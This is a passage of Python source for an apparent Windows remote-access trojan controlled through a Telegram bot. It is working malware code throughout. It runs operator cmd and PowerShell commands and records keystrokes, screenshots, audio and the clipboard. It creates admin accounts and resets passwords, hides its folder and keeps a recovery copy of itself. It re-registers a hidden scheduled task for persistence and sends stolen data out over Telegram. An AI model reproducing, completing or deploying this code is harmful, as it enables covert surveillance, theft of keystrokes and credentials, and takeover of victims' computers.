                tuser, name, description, path, targs, hidden, event = exp['user'], exp['name'], exp['description'], exp['path'], exp['args'], exp['hidden'] == 'true', exp['event'].split(maxsplit=1)

                if not os.path.isfile(path):
                    send(f'file does not exist ({path}) [*]')
                    return

                ctask = create_task(tuser, name, description, path, targs, hidden, event)

                if ctask:
                    send(f'task is created for ({tuser}) user ({name}) [+]')  
                elif ctask is None:
                    send(f'failed to create task for ({tuser}) user ({name}) [-]')
                else:
                    match event[0]:
                        case 'idle':  
                            send('example event (idle 10 20) is valid [*]')
                        case 'time':  
                            send('example event (time 1991-02-20T00:00:00) is valid [*]')
                        case 'event':  
                            send('''example event (event <QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[EventID=4624]]
    </Select>
  </Query>
</QueryList>) is valid [*]''')
                        case _:
                            send(f'invalid value for task creation ({" ".join(event)}) [*]')

                return
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                name = exp['name']

                CoInitialize()

                if not exist_task(name):
                    send(f'task does not exist ({name}) [*]')
                    CoUninitialize()
                    return

                try:
                    scheduler().DeleteTask(name, 0)
                except ConnectionError as error:
                    send(error)
                except:
                    send(f'failed to delete task ({name}) [-]')
                else:
                    send(f'task is deleted ({name}) [+]')

                CoUninitialize()

                return
            elif exp := parse_cmd(r'-m\s*(?P<mode>enable|disable)\s*(?P<name>.+)', args):
                name, mode = exp['name'], exp['mode']

                CoInitialize()

                if not exist_task(name):
                    send(f'task does not exist ({name}) [*]')
                    CoUninitialize()
                    return
                
                try:
                    qtask = scheduler().GetTask(name)
                    qtask.Enabled = mode == 'enable'
                except ConnectionError as error:
                    send(error)
                except:
                    send(f'failed to change task mode ({name}) [-]')
                else:
                    send(f'task mode is changed ({name}) --> ({mode}) [+]')

                CoUninitialize()

                return
            elif exp := parse_cmd(r'-l\s*(?P<name>.*?)\s*-a\s*(?P<args>.+)', args):
                name, targs = exp['name'], exp['args']

                CoInitialize()

                if not exist_task(name):
                    send(f'task does not exist ({name}) [*]')
                    CoUninitialize()
                    return

                try:
                    scheduler().GetTask(name).Run(exp['args'] if targs else None)
                except ConnectionError as error:
                    send(error)
                except:
                    send(f'failed to start task ({name}) [-]')
                else:
                    send(f'task is started ({name}) [+]')

                CoUninitialize()

                return
            elif exp := parse_cmd(r'-s\s*(?P<name>.+)', args):
                name = exp['name']

                CoInitialize()

                if not exist_task(name):
                    send(f'task does not exist ({name}) [*]')
                    CoUninitialize()
                    return
                
                try:
                    scheduler().GetTask(name).Stop(0)
                except ConnectionError as error:
                    send(error)
                except:
                    send(f'failed to stop task ({name}) [-]')
                else:
                    send(f'task is stopped ({name}) [+]')

                CoUninitialize()
                
                return
        case 'startup':
            if args == '-g':
                startup_str = startup()

                send(startup_str, doc='startup.txt') if startup_str else send('startup is empty [*]')
                return
            elif exp := parse_cmd(r'-q\s*(?P<user>machine|user)\s*(?P<name>.+)', args):
                machine, name = exp['user'] == 'machine', exp['name']

                startup_query_list = startup_query(name, machine)

                if startup_query_list is None:
                    send(f'does not exist ({name}) in startup [*]') 
                    return
                
                send(f'NAME: {startup_query_list[0]}\nCOMMAND: {startup_query_list[1]}\nSTATUS: {startup_query_list[2]}')
                return
            elif exp := parse_cmd(r'-c\s*(?P<user>machine|user)\s*(?P<name>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                machine, name, path, sargs = exp['user'] == 'machine', exp['name'], exp['path'], exp['args']

                if not os.path.isfile(path):
                    send(f'file does not exist ({path}) [*]')
                    return
                
                try:
                    reg_set_value(
                        REG_KEY_STARTUP_MACHINE if machine else REG_KEY_STARTUP_USER, 
                        name, 
                        f'"{os.path.realpath(path)}" {sargs}' if sargs != 'none' else quote(os.path.realpath(path)), 
                        'sz'
                    )
                except:
                    send(f'failed to create ({name}) in startup [-]')
                else:
                    send(f'created ({name}) in startup [+]')

                return
            elif exp := parse_cmd(r'-d\s*(?P<user>machine|user)\s*(?P<name>.+)', args):
                machine, name = exp['user'] == 'machine', exp['name']

                query = startup_query(name, machine, reg=True)

                if query is None:
                    send(f'does not exist ({name}) in startup [*]') 
                    return
                
                key = os.path.split(query[0])[0]
                
                try:
                    if key in {REG_KEY_STARTUP_MACHINE, REG_KEY_STARTUP_USER}:
                        reg_delete(key, name, dir=False)
                    else:
                        os.remove(query[0])
                except:
                    send(f'failed to delete from startup ({name}) [-]')
                else:
                    send(f'deleted from startup ({name}) [+]')
                    
                return
            elif exp := parse_cmd(r'-m\s*(?P<user>machine|user)\s*(?P<mode>enable|disable)\s*(?P<name>.+)', args):
                machine, mode, name = exp['user'] == 'machine', exp['mode'], exp['name']

                query = startup_query(name, machine, reg=True)

                if query is None:
                    send(f'does not exist ({name}) in startup [*]') 
                    return
                
                try:
                    reg_set_value(
                        os.path.split(query[2])[0], 
                        name, 
                        REG_VALUE_STARTUP_ENABLED if mode == 'enable' else REG_VALUE_STARTUP_DISABLED, 
                        'binary'
                    )
                except:
                    send(f'failed to change mode ({name}) in startup [-]')
                else:
                    send(f'mode is changed ({name}) --> ({mode}) in startup [+]')

                return
            elif exp := parse_cmd(r'-l\s*(?P<user>machine|user)\s*(?P<name>.+)', args):
                machine, name = exp['user'] == 'machine', exp['name']

                query = startup_query(name, machine, reg=True)

                if query is None:
                    send(f'does not exist ({name}) in startup [*]') 
                    return
                
                command = query[1]

                if os.path.split(query[0])[0] in {REG_KEY_STARTUP_MACHINE, REG_KEY_STARTUP_USER}:
                    send(f'started ({name}) in startup [+]' if (launch if os.path.exists(command) else shell)(command) else f'failed to start ({name}) in startup [-]')
                else:
                    send(f'started ({name}) in startup [+]' if launch(command) else f'failed to start ({name}) in startup [-]')
                    
                return
            elif exp := parse_cmd(r'-s\s*(?P<user>machine|user)\s*(?P<name>.+)', args):
                machine, name = exp['user'] == 'machine', exp['name']
                
                query = startup_query(name, machine, reg=True)

                if query is None:
                    send(f'does not exist ({name}) in startup [*]') 
                    return
                
                command = query[1]

                send(f'stopped ({name}) in startup [+]' if kill(os.path.split(command)[-1] if os.path.exists(command) else command) else f'failed to stop ({name}) in startup [-]')
                return
        case 'app':
            if args == '-g':
                with StringIO() as buf:
                    app_list = app()

                    if not app_list:
                        send(NULL)
                        return
                    
                    for n in app_list:
                        buf.write(f'NAME: {n[0]}\nVENDOR: {n[1]}\nVERSION: {n[2]}\nLANG: {n[3]}\nDATE: {n[4]}\n\n')
                    
                    send(buf.getvalue(), doc='app.txt') 
                    return
            elif exp := parse_cmd(r'-u\s*(?P<name>.+)', args):
                name = exp['name']

                send(f'app is deleted ({name}) [+]' if delete_app(name) else f'failed to delete app ({name}) [-]')
                return
            elif args == '-l':
                try:
                    blocked_apps = decrypt(read_file(FILE_APP_BLOCKER)).splitlines()
                except:
                    send('no blocked apps [*]')
                    return
                
                bapps = []
                
                for line in blocked_apps:
                    n = line.split('=')

                    if len(n) == 2:
                        bapps.append([n[0], n[1]])
                
                send(tabulate(bapps, headers=[('NAME'), ('DATE')], tablefmt='grid'), doc='blocked_apps.txt') if bapps else send('no blocked apps [*]')
                return
            elif exp := parse_cmd(r'-b\s*(?P<name>.+)', args):
                name, date = exp['name'], get_date()

                if not os.path.isfile(FILE_APP_BLOCKER):
                    write_file(FILE_APP_BLOCKER, '')

                send(f'app is blocked ({name}) [+]' if change_file(FILE_APP_BLOCKER, name, f'{name}={date[0]} | {date[1]}', enc=True) else f'failed to block app ({name}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                name = exp['name']

                send(f'app is unblocked ({name}) [+]' if change_file(FILE_APP_BLOCKER, name, name, delete=True, enc=True) else f'app does not exist ({name}) [*]') if os.path.isfile(FILE_APP_BLOCKER) else send('no blocked apps [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_APP_BLOCKER):
                    write_file(FILE_APP_BLOCKER, '')
                    send('apps is unblocked [+]')
                else:
                    send('no blocked apps [*]')

                return
        case 'env':
            if args == '-g':
                with StringIO() as buf:
                    for (key, value) in os.environ.items():
                        buf.write(f'{key}={value}\n')
                    
                    send(buf.getvalue(), doc='environment.txt')
                    return
            elif exp := parse_cmd(r'-q\s*(?P<key>.+)', args):
                key = exp['key']

                send(str(os.getenv(key, f'environment key does not exist ({key}) [*]')))
                return
            elif exp := parse_cmd(r'-c\s*(?P<user>machine|user|tmp)\s*(?P<key>.*?)\s*-v\s*(?P<value>.*?)\s*-t\s*(?P<type>none|sz|expand_sz|binary|dword|dword_big_endian|qword)', args):
                tenv, key, value, value_type = exp['user'], exp['key'], exp['value'], exp['type']

                match tenv:
                    case 'machine':
                        reg_env = REG_KEY_ENV_MACHINE
                    case 'user':
                        reg_env = REG_KEY_ENV_USER
                    case 'tmp':
                        reg_env = REG_KEY_TMP_ENV_USER

                try:
                    reg_set_value(reg_env, key, value, value_type)
                except:
                    send(f'failed to create environment key ({key}) [-]')
                else:
                    send(f'environment key is created ({key}={value}) [+]')

                return
            elif exp := parse_cmd(r'-d\s*(?P<user>machine|user|tmp)\s*(?P<key>.+)', args):
                tenv, key = exp['user'], exp['key']

                match tenv:
                    case 'machine':
                        reg_env = REG_KEY_ENV_MACHINE
                    case 'user':
                        reg_env = REG_KEY_ENV_USER
                    case 'tmp':
                        reg_env = REG_KEY_TMP_ENV_USER

                try:
                    reg_delete(reg_env, key, dir=False)
                except FileNotFoundError:
                    send(f'environment key does not exist ({key}) [*]')
                except:
                    send(f'failed to delete environment key ({key}) [-]')
                else:
                    send(f'environment key is deleted ({key}) [+]')

                return
        case 'lang':
            if args == '-g':
                clang = powershell('(Get-WinUserLanguageList).LanguageTag', output=True)

                send(clang if clang else NULL)
                return
            elif exp := parse_cmd(r'-i\s*(?P<lang>.+)', args):
                clang = exp['lang']

                send(f'language is installed ({clang}) [+]' if powershell(f'Install-Language -Language {quote(clang)}') else f'failed to install language ({clang}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<lang>.+)', args) :
                clang = exp['lang']

                clangl = powershell('(Get-WinUserLanguageList).LanguageTag', output=True)

                if (clangl is None) or (clang not in clangl):
                    send(f'language does not exist ({clang}) [*]')
                    return
                
                powershell('Get-WindowsPackage -Online | Where-Object { $_.PackageName -like \'*' + clang + '*\' } | ForEach-Object { Remove-WindowsPackage -Online -PackageName $_.PackageName }')
                send(f'language is deleted ({clang}) [+]')
                return
            elif exp := parse_cmd(r'-s\s*(?P<lang>.+)', args):
                clang = exp['lang']

                clangl = powershell('(Get-WinUserLanguageList).LanguageTag', output=True)

                if (clangl is None) or (clang not in clangl):
                    send(f'language does not exist ({clang}) [*]')
                    return

                powershell(f'Set-WinSystemLocale {quote(clang)}')
                powershell(f'Set-WinUILanguageOverride -Language {quote(clang)}')
                send(f'language is set ({clang}) [+]')

                return
        case 'user':
            if args == '-g':
                with StringIO() as buf:
                    user_list = user('get', None)

                    if not user_list:
                        send(NULL)
                        return

                    for n in user_list:
                        buf.write(f'''SID: {n[0]}
FULL NAME: {n[1]}
NAME: {n[2]}
DESCRIPTION: {n[3]}
ADMIN: {n[4]}
LOGIN ATTEMPTS: {n[5]}
LOGGED IN: {n[6]}
STATUS: {"ENABLED" if n[7] else "DISABLED"}\n
''')

                    send(buf.getvalue(), doc='user.txt')
                    return
            elif exp := parse_cmd(r'-g\s*(?P<name>.+)', args):
                send(user('query_group', exp['name']))
                return
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                n = user('query', name)

                send(f'''SID: {n[0]}
FULL NAME: {n[1]}
NAME: {n[2]}
DESCRIPTION: {n[3]}
ADMIN: {n[4]}
LOGIN ATTEMPTS: {n[5]}
LOGGED IN: {n[6]}
STATUS: {"ENABLED" if n[7] else "DISABLED"}\n
''') if n else send(NULL)
                return
            elif exp := parse_cmd(r'(?P<mode>-j|-uj)\s*(?P<name>.*?)\s*-g\s*(?P<group>.+)', args):
                send(user('ungroup' if exp['mode'] == '-uj' else 'group', exp['name'], group=exp['group']))
                return
            elif exp := parse_cmd(r'(?P<mode>-a|-ua)\s*(?P<name>.+)', args):
                send(user('admin' if exp['mode'] == '-a' else 'unadmin', exp['name']))
                return
            elif exp := parse_cmd(r'-p\s*(?P<name>.*?)\s*-o\s*(?P<old_password>.*?)\s*-n\s*(?P<new_password>.+)', args):
                old_password, new_password = exp['old_password'], exp['new_password']

                send(user(
                    'password', 
                    exp['name'], 
                    old_password='' if old_password == 'none' else old_password, 
                    password='' if new_password == 'none' else new_password
                ))
                return
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<password>.*?)\s*-d\s*(?P<description>.+)', args):
                name, upassword, description = exp['name'], exp['password'], exp['description']

                send(user(
                    'create', 
                    name, 
                    password='' if upassword == 'none' else upassword, 
                    description='' if description == 'none' else description
                ))
                return
            elif exp := parse_cmd(r'-r\s*(?P<name>.+)', args):
                send(user('delete', exp['name']))
                return
            elif exp := parse_cmd(r'(?P<mode>-e|-d)\s*(?P<name>.+)', args):
                send(user('enable' if exp['mode'] == '-e' else 'disable', exp['name']))
                return
        case 'kill':
            send(f'killed ({args}) [+]' if kill(args) else f'failed to kill ({args}) [-]')
            return
        case 'run':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-w\s*(?P<window>true|false)', args):
                file_path, file_args, file_window = exp['path'], exp['args'], exp['window'] == 'true'

                start_file = launch(file_path, '' if file_args == 'none' else file_args, window=file_window)

                if start_file is None:
                    send(f'path does not exist ({file_path}) [*]')
                else:
                    send(f'ran file ({file_path}) [+]' if start_file else f'failed to run file ({file_path}) [-]')

                return
        case 'cmd':
            if exp := parse_cmd(r'(?P<output>-e|-g)\s*(?P<command>.+)', args):
                output, command = exp['output'] == '-g', exp['command']

                if not output:
                    send(f'cmd command is executed ({command}) [+]' if wincmd(command) else f'failed to execute cmd command ({command}) [-]')
                else:
                    send(wincmd(command, output=True), doc='cmd.txt')
                    
                return
        case 'powershell':
            if exp := parse_cmd(r'(?P<output>-e|-g)\s*(?P<command>.+)', args):
                output, command = exp['output'] == '-g', exp['command']

                if not output:
                    send(f'powershell command is executed ({command}) [+]' if powershell(command) else f'failed to execute powershell command ({command}) [-]')
                else:
                    send(powershell(command, output=True), doc='powershell.txt')
                    
                return
        case 'time':
            if args == '-g':
                send(get_date()[0])
                return
            elif exp := parse_cmd(r'-s\s*(?P<time>.+)', args):
                time_ = exp['time']

                send(f'time is changed ({time_}) [+]' if shell(f'time {time_}') else f'time is invalid ({time_}) [-]') 
                return
        case 'date':
            if args == '-g':
                send(get_date()[1])
                return
            elif exp := parse_cmd(r'-s\s*(?P<date>.+)', args):
                date = exp['date']

                send(f'date is changed ({date}) [+]' if shell(f'date {date}') else f'date is invalid ({date}) [-]')
                return            
        case 'mouse':
            if args == '-p':
                x, y = mouse.get_position()

                send(f'mouse position ({x}x{y})')
                return
            elif exp := parse_cmd(r'-d\s*(?P<display>true|false)', args):
                cshow = exp['display'] == 'true'

                win32api.ShowCursor(cshow)
                send('mouse is displayed [+]' if cshow else 'failed to display mouse [+]')
                return
            elif exp := parse_cmd(r'-t\s*(?P<trail>[0-7])', args):
                mtrail = exp['trail']

                reg_set_value(REG_KEY_MOUSE, 'MouseTrails', mtrail, 'sz')
                send(f'mouse trail is set ({mtrail}) [+]')
                return
            elif exp := parse_cmd(r'-c\s*arrow\s*(?P<arrow>.*?)\s*ibeam\s*(?P<ibeam>.*?)\s*hand\s*(?P<hand>.*?)\s*wait\s*(?P<wait>.+)', args):
                arrow, ibeam, hand, wait = exp['arrow'], exp['ibeam'], exp['hand'], exp['wait'] 

                if verify_cursor(arrow):
                    reg_set_value(REG_KEY_CURSOR, 'Arrow', quote(os.path.realpath(arrow)), 'sz')
                    send(f'mouse arrow cursor is changed ({arrow}) [+]')
                
                if verify_cursor(ibeam):
                    reg_set_value(REG_KEY_CURSOR, 'IBeam', quote(os.path.realpath(ibeam)), 'sz')
                    send(f'mouse ibeam cursor is changed ({ibeam}) [+]')
                
                if verify_cursor(hand):
                    reg_set_value(REG_KEY_CURSOR, 'Hand', quote(os.path.realpath(hand)), 'sz')
                    send(f'mouse hand cursor is changed ({hand}) [+]')

                if verify_cursor(wait):
                    reg_set_value(REG_KEY_CURSOR, 'Wait', quote(os.path.realpath(wait)), 'sz')
                    send(f'mouse wait cursor is changed ({wait}) [+]')

                return
            elif exp := parse_cmd(r'-x\s*(?P<x>\d+)\s*-y\s*(?P<y>\d+)\s*-d\s*(?P<delay>\d+)', args):
                x, y, delay = int(exp['x']), int(exp['y']), int(exp['delay'])

                mouse.move(x, y, duration=delay)
                send(f'mouse is moved ({x}x{y}) [+]')
                return
            elif exp := parse_cmd(r'-f\s*(?P<sens>20|1[0-9]|[1-9])', args):
                msens = exp['sens']

                reg_set_value(REG_KEY_MOUSE, 'MouseSensitivity', msens, 'sz')
                send(f'mouse sensitivity is set ({msens}) [+]')
                return
            elif exp := parse_cmd(r'-v\s*(?P<speed>0|1|2)', args):
                mspeed = exp['speed']

                reg_set_value(REG_KEY_MOUSE, 'MouseSpeed', mspeed, 'sz')
                send(f'mouse speed is set ({mspeed}) [+]')
                return
            elif exp := parse_cmd(r'(?P<button>-l|-r|-m)\s*-c\s*(?P<click>\d+)\s*-d\s*(?P<delay>\d+)', args):
                click, delay, button = int(exp['click']), int(exp['delay']), exp['button']

                match button:
                    case '-l':
                        button = 'left'
                        mbutton = mouse.LEFT
                    case '-r':
                        button = 'right'
                        mbutton = mouse.RIGHT
                    case '-m':
                        button = 'middle'
                        mbutton = mouse.MIDDLE
                            
                for _ in range(click):
                    mouse.press(mbutton)
                    sleep(delay)
                    mouse.release(mbutton)

                send(f'mouse button ({button}) is clicked ({click}) [+]')
                return
            elif exp := parse_cmd(r'-b\s*(?P<swap>true|false)', args):
                mswap = exp['swap'] == 'true'

                reg_set_value(REG_KEY_MOUSE, 'SwapMouseButtons', '1' if mswap else '0', 'sz')
                send(f'mouse buttons is ' + ('swapped' if mswap else 'unswapped') + ' [+]')
                return
            elif exp := parse_cmd(r'-s\s*(?P<amount>-*\d+)', args):
                amount = int(exp['amount'])

                mouse.wheel(amount)
                send(f'mouse is scrolled ({amount}) [+]')
                return
        case 'keyboard':
            if args == '-l':
                send(get_layout())
                return
            elif exp := parse_cmd(r'-s\s*(?P<layout>\w{2})', args):
                layout = exp['layout']

                for (c, l) in KEYBOARD_LAYOUT.items():
                    if layout == l:
                        try:
                            win32api.LoadKeyboardLayout(c, win32con.KLF_ACTIVATE)
                        except:
                            send(f'failed to set keyboard layout ({layout}) [-]')
                        else:
                            send(f'keyboard layout is set ({layout}) [+]')
                        
                        break
                else:
                    send(f'keyboard layout does not exist ({layout}) [*]')

                return
            elif exp := parse_cmd(r'-v\s*(?P<speed>3[0-1]|2[0-9]|1[0-9]|[1-9])', args):
                kspeed = exp['speed']

                reg_set_value(REG_KEY_KEYBOARD, 'KeyboardSpeed', kspeed, 'sz')
                send(f'keyboard speed is set ({kspeed}) [+]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<delay>[0-3])', args):
                kdelay = exp['delay']

                reg_set_value(REG_KEY_KEYBOARD, 'KeyboardDelay', kdelay, 'sz')
                send(f'keyboard delay is set ({kdelay}) [+]')
                return
            elif exp := parse_cmd(r'-t\s*(?P<text>.*?)\s*-d\s*(?P<delay>\d+)', args):
                text, delay = exp['text'], int(exp['delay'])

                kb.write(text, delay)
                send(f'keyboard wrote ({text}) [+]')
                return
            elif exp := parse_cmd(r'-k\s*(?P<key>.*?)\s*-p\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args):
                key, amount, delay = exp['key'], int(exp['amount']), int(exp['delay'])

                for _ in range(amount):
                    try:
                        kb.press(key)
                        sleep(delay)
                        kb.release(key)
                    except:
                        send(f'keyboard key is invalid ({key}) [-]')
                        return

                send(f'keyboard key ({key}) is pressed ({amount}) [+]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<type>-k|-h)\s*(?P<key>.*?)\s*-n\s*(?P<new_key>.+)', args):
                key_type, key, new_key = exp['type'], exp['key'], exp['new_key']

                try:
                    (kb.remap_key if key_type == '-k' else kb.remap_hotkey)(key, new_key)
                except:
                    send('failed to remap keyboard ' + ('key' if key_type == '-k' else 'hotkey') + f' ({key}) [-]')
                else:
                    send('remapped keyboard ' + ('key' if key_type == '-k' else 'hotkey') + f' ({key}) --> ({new_key}) [+]')

                return
            elif exp := parse_cmd(r'-b\s*(?P<key>.+)', args):
                key = exp['key']

                try:
                    kb.block_key(key)
                except:
                    send(f'failed to block keyboard key ({key}) [-]')
                else:
                    send(f'keyboard key is blocked ({key}) [+]')

                return
            elif args == '-r':
                kb.unhook_all()
                send(f'keyboard keys is unblocked [+]')
                return  
        case 'clipboard':
            if args == '-g':
                clipboard_data = init_clipboard(win32clipboard.GetClipboardData)

                send(clipboard_data, doc='clipboard.txt') if clipboard_data else send('clipboard is empty [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<data>.+)', args):
                init_clipboard(win32clipboard.EmptyClipboard)       
                init_clipboard(win32clipboard.SetClipboardText, exp['data'])

                send('copied to clipboard [+]')
                return
            elif args == '-r':
                init_clipboard(win32clipboard.EmptyClipboard)

                send(f'clipboard is cleared [+]')
                return
        case 'screen':
            if args == '-e':
                try:
                    win32api.keybd_event(win32con.VK_ESCAPE, 0, win32con.KEYEVENTF_SCANCODE, 0) 
                    sleep(0.1)  
                    win32api.keybd_event(win32con.VK_ESCAPE, 0, win32con.KEYEVENTF_KEYUP, 0) 
                except:
                    send('failed to turned on screen [-]')
                else:
                    send('screen on [+]')

                return
            elif args == '-d':
                try:
                    win32api.SendMessage(0xFFFF, 0x112, 0xF170, 2)
                except:
                    send('failed to turned off screen [-]')
                else:
                    send('screen off [+]')

                return
            elif args == '-s':
                png = screenshot()

                send('failed to take screenshot [-]') if png is None else send(png, doc='screenshot.png')
                return
            elif exp := parse_cmd(r'-w\s*(?P<path>.+)', args):
                path = exp['path']

                if opencv.imread(path) is not None:
                    reg_set_value(REG_KEY_DESKTOP, 'WallPaper', quote(os.path.realpath(path)), 'sz')
                    send(f'wallpaper is changed ({path}) [+]')
                else:
                    send(f'wallpaper does not exist ({path}) [*]')

                return
        case 'audio':
            if args.isdigit():
                second = int(args)

                if second > 600:
                    send(f'maximum sound limit is 600 seconds [*]')
                    return
                
                send(f'audio start record ({second}s) [*]')
                wav = audio(second)

                send('failed to record audio [-]') if wav is None else send(wav, doc='audio.mp3')
                return
            elif exp := parse_cmd(r'-p\s*(?P<path>.+)', args):
                audio_path = exp['path']

                if os.path.isfile(audio_path):
                    try:
                        playsound(audio_path, False)
                        send(f'audio is playing ({audio_path}) [*]')
                    except:
                        send(f'failed to play audio ({audio_path}) [-]')
                    else:
                        send(f'audio is played ({audio_path}) [+]')
                else:
                    send(f'audio does not exist ({audio_path}) [*]')

                return
        case 'img':
            send(f'image is displayed ({args}) [+]' if display_img(args) else f'failed to display image ({args}) [-]') if os.path.isfile(args) else send(f'image does not exist ({args}) [*]')
            return
        case 'msg':
            if exp := parse_cmd(r'(?P<type>-p|-s|-i|-w|-e)\s*(?P<title>.*?)\s*-t\s*(?P<text>.+)', args):
                msg_type, title, text = exp['type'], exp['title'].replace('\\t', '\t').replace('\\n', '\n'), exp['text'].replace('\\t', '\t').replace('\\n', '\n')
                
                match msg_type:
                    case '-p':
                        Notification(title, '', text, duration='long').show()
                        send('msg push [+]')
                    case '-s':
                        win32api.MessageBox(0, text, title, win32con.MB_SYSTEMMODAL)
                        send('msg system [+]')
                    case '-i':
                        win32api.MessageBox(0, text, title, win32con.MB_ICONINFORMATION)
                        send('msg information [+]')
                    case '-w':
                        win32api.MessageBox(0, text, title, win32con.MB_ICONWARNING)
                        send('msg warning [+]')
                    case '-e':
                        win32api.MessageBox(0, text, title, win32con.MB_ICONERROR)
                        send('msg error [+]')

                return
        case 'keylogger':
            if exp := parse_cmd(r'-g\s*(?P<mode>base|char|hotkey|no hotkey)', args):
                if os.path.isfile(FILE_KEYLOGGER):
                    try:
                        data = keylogger_parser(exp['mode'])

                        send(data, doc='keylogger.txt') if data else send('keylogger data is empty [*]')
                    except:
                        send('failed to get keylogger data [-]')
                else:
                    send('keylogger is disabled [*]')
                
                return

            match args:
                case '-e':
                    write_file(FILE_KEYLOGGER_FLAG, '1')
                    send('keylogger is enabled [+]')
                    return
                case '-d':
                    write_file(FILE_KEYLOGGER_FLAG, '0')
                    send('keylogger is disabled [+]')
                    return
                case '-s':
                    send('keylogger is enabled [+]' if os.path.isfile(FILE_KEYLOGGER_FLAG) and (read_file(FILE_KEYLOGGER_FLAG) == '1') else 'keylogger is disabled [-]')
                    return   
                case '-r':
                    if os.path.isfile(FILE_KEYLOGGER):
                        write_file(FILE_KEYLOGGER, '')
                        send('keylogger data is reset [+]')
                    else:
                        send('keylogger is disabled [*]')

                    return
             
    send(f'command not found ({cmd})')


def get_admin():
    if windll.shell32.IsUserAnAdmin() != 0:
        return
    
    try:
        win32api.ShellExecute(
            None, 
            'runas', 
            *((__file__, None) if IS_EXE else (pyexe, __file__)), 
            None, 
            1
        )
    except: 
        raise PermissionError('Administrator rights are required to execute')
    else:
        os._exit(0)


def setup():
    mkdir(PATH)
    hide(PATH)
    
    if not BOT_EXE:
        mkdir([
            PATH_MEM,
            PATH_SYS, 
            PATH_CONF,
            PATH_TMP,
            PATH_SHARE
        ])
        return
    
    if not os.path.isfile(BOT_FILE_PATH) and os.path.isfile(BOT_FILE_NAME):
        shutil.move(BOT_FILE_NAME, BOT_FILE_PATH)
    
    while True:
        mkdir([
            PATH,
            PATH_MEM,
            PATH_SYS, 
            PATH_CONF,
            PATH_TMP,
            PATH_SHARE
        ])

        hide(PATH)

        if not os.path.isfile(BOT_FILE_PATH_RECOVERY) and os.path.isfile(BOT_FILE_PATH):
            shutil.copy(BOT_FILE_PATH, BOT_FILE_PATH_RECOVERY)
            hide(BOT_FILE_PATH_RECOVERY)
        
        if not os.path.isfile(BOT_FILE_PATH) and os.path.isfile(BOT_FILE_PATH_RECOVERY):
            shutil.copy(BOT_FILE_PATH_RECOVERY, BOT_FILE_PATH)
        
        create_task(
            'users',
            name=BOT_TASK_NAME,
            description=BOT_TASK_DESCRIPTION,
            path=BOT_FILE_PATH,
            targs='none',
            hidden='true',
            event=['time'],
            bot_task=True
        )

        sleep(3)


def init():
    invalid_type('TOKEN', TOKEN, str)
    invalid_type('PASSWORD', PASSWORD, str)
    invalid_type('SEED', SEED, int)
    invalid_type('PATH', PATH, str)
    invalid_type('BOT_TASK_NAME', BOT_TASK_NAME, str)
    invalid_type('BOT_TASK_DESCRIPTION', BOT_TASK_DESCRIPTION, str)
    
    if len(TOKEN) != 46:
        raise ValueError('Telegram bot (TOKEN) is invalid')
    
    if not PASSWORD:
        raise ValueError('(PASSWORD) is empty')

    try:
        decrypt(encrypt(' \t\n\u200B\u200F\u20600123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZабвгдеёжзийклмнопрстуфхцчшщыэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЫЭЮЯЄєЇїІіҐґ'))
    except:
        raise ValueError('(SEED) is invalid')
    
    if not os.path.isdir(os.path.split(PATH)[0]):
        raise ValueError('(PATH) is invalid')
    
    if BOT_EXE and not BOT_TASK_NAME:
        raise ValueError('(BOT_TASK_NAME) is empty')
    
    if BOT_EXE and not BOT_TASK_DESCRIPTION:
        raise ValueError('(BOT_TASK_DESCRIPTION) is empty')
    
    get_admin()

    Thread(target=setup, daemon=False).start()
    Thread(target=autostart, daemon=False).start()
    Thread(target=app_blocker, daemon=False).start()
    Thread(target=keylogger, daemon=False).start()


def bot():
    tg = TeleBot(
        TOKEN,
        validate_token=True,
        disable_web_page_preview=True,
        protect_content=True,
        threaded=True,
        num_threads=3,
        suppress_middleware_excepions=True
    )

    try:
        tg.get_me()
    except ApiException:
        raise SystemExit('TOKEN', '(TOKEN) is invalid or unauthorized')
    
    session_date = get_date()
    session = f'''
GitHub   : https://github.com/vk-candpython
AUTHOR   : Vladislav Khudash
VERSION  : win32

HOST     : {NODE}\\\\{USER} 
PLATFORM : {OS["platform"]} {OS["release"]} {OS["edition"]} 
DATE     : {session_date[0]} | {session_date[1]}
'''


    def send(chat_id, data, doc=''):
        if not doc:
            tg.send_message(chat_id, data) 
        else:
            if isinstance(data, str):
                data = data.encode()

            tg.send_document(chat_id, data, visible_file_name=doc)


    def verify_user(chat_id, user_id, user_name, password, date):
        password = password.encode()

        path_user = os.path.join(PATH_MEM, mem_id(user_id))

        if os.path.isfile(path_user): 
            return True
        
        if sha256(password).hexdigest() == PASSWORD:
            send(chat_id, session)
            write_file(path_user, encrypt(f'{user_name}={date[0]} | {date[1]}'))
            return True
        else:
            send(chat_id, 'Enter password to connect to session [*]')
            return False
    

    @tg.message_handler(content_types=['text'])
    def executor(msg):
        chat_id = msg.chat.id 
        user_id = msg.from_user.id 
        user_name = msg.from_user.username
        cmd = msg.text.strip()

        if not verify_user(chat_id, user_id, user_name, cmd, session_date):
            return
        elif cmd == 'session':
            send(chat_id, session)
            return
        elif cmd == 'exit':
            session_id = mem_id(user_id)
            mem_user = os.path.join(PATH_MEM, session_id)

            if os.path.isfile(mem_user):
                os.remove(mem_user)
                send(chat_id, f'session is left ({session_id}) [+]')
            else:
                send(chat_id, f'your account is not verified ({user_id}) [*]')
            
            return
        elif cmd == 'restart': 
            if os.path.isfile(FILE_BOT_RESTART):
                os.remove(FILE_BOT_RESTART)
                return
        
        send_execute = lambda data, doc='': send(chat_id, data, doc)

        try:
            execute(cmd, send_execute)
        except BaseException as error:
